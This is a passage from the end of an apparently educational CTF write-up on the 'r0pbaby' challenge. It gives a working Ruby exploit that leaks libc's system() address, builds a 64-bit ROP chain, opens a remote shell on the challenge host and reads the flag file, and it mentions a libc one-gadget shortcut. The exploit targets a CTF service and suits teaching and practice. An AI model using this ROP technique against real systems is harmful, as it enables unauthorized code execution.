So in the interest of proving that this actually returns to a function, we'll call printf (0x00007FFFF7892F10) instead:

<pre>
$ <strong>echo -ne '3\n32\nAAAAAAAA\xc9\xb2\x92\xf7\xff\x7f\x00\x00\x10\x2f\x89\xf7\xff\x7f\x00\x00\x7c\x30\x9a\xf7\xff\x7f\x00\x00\n' | ./r0pbaby</strong>

Welcome to an easy Return Oriented Programming challenge...
Menu:
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: Enter bytes to send (max 1024): 1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: Bad choice.
/bin/sh
</pre>

It prints out its first parameter - "/bin/sh" - proving that printf() was called and therefore the return chain works!

<h2>The exploit</h2>

Here's the full exploit in Ruby. If you want to run this against your own system, you'll have to calculate the offset of the "/bin/sh" string and the handy-dandy gadget first! Just find them in IDA or objdump or whatever and subtract the address of system() from them.

<pre id='vimCodeElement'>
<span class="PreProc">#!/usr/bin/ruby</span>

<span class="PreProc">require</span> <span class="Special">'</span><span class="Constant">socket</span><span class="Special">'</span>

<span class="Type">SH_OFFSET_REAL</span> = <span class="Constant">0x13669b</span>
<span class="Type">SH_OFFSET_MINE</span> = <span class="Constant">0x11f71c</span>

<span class="Type">GADGET_OFFSET_REAL</span> = <span class="Constant">0xb3e39</span>
<span class="Type">GADGET_OFFSET_MINE</span> = <span class="Constant">0xa7969</span>

<span class="Comment">#HOST = &quot;localhost&quot;</span>
<span class="Type">HOST</span> = <span class="Special">&quot;</span><span class="Constant">r0pbaby_542ee6516410709a1421141501f03760.quals.shallweplayaga.me</span><span class="Special">&quot;</span>

<span class="Type">PORT</span> = <span class="Constant">10436</span>

s = <span class="Type">TCPSocket</span>.new(<span class="Type">HOST</span>, <span class="Type">PORT</span>)

<span class="Comment"># Receive until the string matches the regex, then delete everything</span>
<span class="Comment"># up to the regex</span>
<span class="rubyDefine">def</span> <span class="Identifier">recv_until</span>(s, regex)
  buffer = <span class="Special">&quot;&quot;</span>

  <span class="Statement">loop</span> <span class="Statement">do</span>
    buffer += s.recv(<span class="Constant">1024</span>)
    <span class="Statement">if</span>(buffer =~ <span class="Special">/</span><span class="Special">#{</span>regex<span class="Special">}</span><span class="Special">/m</span>)
      <span class="Statement">return</span> buffer.gsub(<span class="Special">/</span><span class="Special">.</span><span class="Special">*</span><span class="Special">#{</span>regex<span class="Special">}</span><span class="Special">/m</span>, <span class="Special">''</span>)
    <span class="Statement">end</span>
  <span class="Statement">end</span>
<span class="rubyDefine">end</span>

<span class="Comment"># Get the address of &quot;system&quot;</span>
puts(<span class="Special">&quot;</span><span class="Constant">Getting the address of system()...</span><span class="Special">&quot;</span>)
s.write(<span class="Special">&quot;</span><span class="Constant">2</span><span class="Special">\n</span><span class="Special">&quot;</span>)
s.write(<span class="Special">&quot;</span><span class="Constant">system</span><span class="Special">\n</span><span class="Special">&quot;</span>)
system_addr = recv_until(s, <span class="Special">&quot;</span><span class="Constant">Symbol system: </span><span class="Special">&quot;</span>).to_i(<span class="Constant">16</span>)
puts(<span class="Special">&quot;</span><span class="Constant">system() is at 0x%08x</span><span class="Special">&quot;</span> % system_addr)

<span class="Comment"># Build the ROP chain</span>
puts(<span class="Special">&quot;</span><span class="Constant">Building the ROP chain...</span><span class="Special">&quot;</span>)
payload = <span class="Special">&quot;</span><span class="Constant">AAAAAAAA</span><span class="Special">&quot;</span> +
  [system_addr + <span class="Type">GADGET_OFFSET_REAL</span>].pack(<span class="Special">&quot;</span><span class="Constant">&lt;Q</span><span class="Special">&quot;</span>) + <span class="Comment"># address of the gadget</span>
  [system_addr].pack(<span class="Special">&quot;</span><span class="Constant">&lt;Q</span><span class="Special">&quot;</span>) +                      <span class="Comment"># address of system</span>
  [system_addr + <span class="Type">SH_OFFSET_REAL</span>].pack(<span class="Special">&quot;</span><span class="Constant">&lt;Q</span><span class="Special">&quot;</span>) +     <span class="Comment"># address of &quot;/bin/sh&quot;</span>
  <span class="Special">&quot;&quot;</span>

<span class="Comment"># Write the ROP chain</span>
puts(<span class="Special">&quot;</span><span class="Constant">Sending the ROP chain...</span><span class="Special">&quot;</span>)
s.write(<span class="Special">&quot;</span><span class="Constant">3</span><span class="Special">\n</span><span class="Special">&quot;</span>)
s.write(<span class="Special">&quot;</span><span class="Special">#{</span>payload.length<span class="Special">}</span><span class="Special">\n</span><span class="Special">&quot;</span>)
s.write(payload)

<span class="Comment"># Tell the program to exit</span>
puts(<span class="Special">&quot;</span><span class="Constant">Exiting the program...</span><span class="Special">&quot;</span>)
s.write(<span class="Special">&quot;</span><span class="Constant">4</span><span class="Special">\n</span><span class="Special">&quot;</span>)

<span class="Comment"># Give sh some time to start</span>
puts(<span class="Special">&quot;</span><span class="Constant">Pausing...</span><span class="Special">&quot;</span>)
sleep(<span class="Constant">1</span>)

<span class="Comment"># Write the command we want to run</span>
puts(<span class="Special">&quot;</span><span class="Constant">Attempting to read the flag!</span><span class="Special">&quot;</span>)
s.write(<span class="Special">&quot;</span><span class="Constant">cat /home/r0pbaby/flag</span><span class="Special">\n</span><span class="Special">&quot;</span>)

<span class="Comment"># Receive forever</span>
<span class="Statement">loop</span> <span class="Statement">do</span>
  x = s.recv(<span class="Constant">1024</span>)

  <span class="Statement">if</span>(x.nil? || x == <span class="Special">&quot;&quot;</span>)
    puts(<span class="Special">&quot;</span><span class="Constant">Done!</span><span class="Special">&quot;</span>)
    <span class="Statement">exit</span>
  <span class="Statement">end</span>
  puts(x)
<span class="Statement">end</span>
</pre>

<a name='update1'></a>

<h2>[update] Or... do it the easy way</h2>

After I posted this, I got a tweet from <a href='https://twitter.com/gaasedelen'>@gaasedelen</a> informing me that libc has a "magic" address that will literally call exec() with "/bin/sh", making much of this unnecessary for this particular level. You can find it by seeing where the "/bin/sh" string is referenced. You can return to that address and a shell pops.

But it's still a good idea to know how to construct a ROP chain, even if it's not strictly necessary. :)

<h2>Conclusion</h2>

And that's how to perform a ROP attack against a 64-bit binary! I'd love to hear feedback!
